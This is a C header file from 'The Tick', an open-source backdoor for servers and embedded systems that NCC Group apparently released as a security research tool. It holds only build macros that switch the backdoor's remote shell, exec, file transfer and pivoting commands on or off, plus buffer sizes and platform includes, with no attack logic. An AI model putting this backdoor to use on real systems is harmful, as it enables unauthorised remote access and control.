/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#ifndef COMMON_H
#define COMMON_H

/*****************************************************************************/

// Feature control. Define any of these macros with -D at the makefile level:
// TICK_FEATURES_NO_CRYPTO: disables protocol encryption
// TICK_FEATURES_NO_SHELL:  disables the shell command
// TICK_FEATURES_NO_EXEC:   disables the exec command
// TICK_FEATURES_NO_FILE:   disables push, pop, rm and chmod commands
// TICK_FEATURES_NO_DNS:    disables DNS resolution (affects dig and proxy, and
//                          you can only use IP addresses for setup)
// TICK_FEATURES_NO_PIVOT:  disables pivoting and proxy support

// Buffer size for the parser.
// We keep a fixed buffer size to ensure memory consumption is more or less fixed.
// This is especially important on embedded systems.
// Do not let it exceed one memory page or it may cause stack overrun problems.
#ifndef TICK_PARSER_BUFFER_SIZE
#define TICK_PARSER_BUFFER_SIZE 1024
#endif

// Buffer size for the response of the "exec" command.
// We keep a fixed buffer size to ensure memory consumption is more or less fixed.
// This is especially important on embedded systems.
// Do not let it exceed one memory page or it may cause stack overrun problems.
#ifndef TICK_EXEC_BUFFER_SIZE
#define TICK_EXEC_BUFFER_SIZE 4096
#endif

// Log function. Wraps on printf, when disabled at compile time it's effectively a no-op.
#ifdef TICK_VERBOSE
#include <stdio.h>
#define LOG(...) printf(__VA_ARGS__)
#else
#define LOG(...)
#endif

/*****************************************************************************/

#include <errno.h>
#include <fcntl.h>
#include <libgen.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/param.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>

#ifdef _WIN32

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winbase.h>
#include <fileapi.h>
#include <processthreadsapi.h>
#include <minwindef.h>
#include <synchapi.h>
#include <namedpipeapi.h>

// https://docs.microsoft.com/en-us/windows/win32/api/ws2tcpip/nf-ws2tcpip-getaddrinfo#support-for-getaddrinfo-on-windows-2000-and-older-versions
#include <wspiapi.h>

#define O_SYNC 0

#define SHUT_RD SD_RECEIVE
#define SHUT_WR SD_SEND
#define SHUT_RDWR SD_BOTH

#define MIN min
#define MAX max

#else

#include <netdb.h>
#include <signal.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/statvfs.h>

#define O_BINARY 0
#define O_SEQUENTIAL 0

#endif

#ifndef MSG_NOSIGNAL
#define MSG_NOSIGNAL 0
#endif

/*****************************************************************************/

#endif /* COMMON_H */
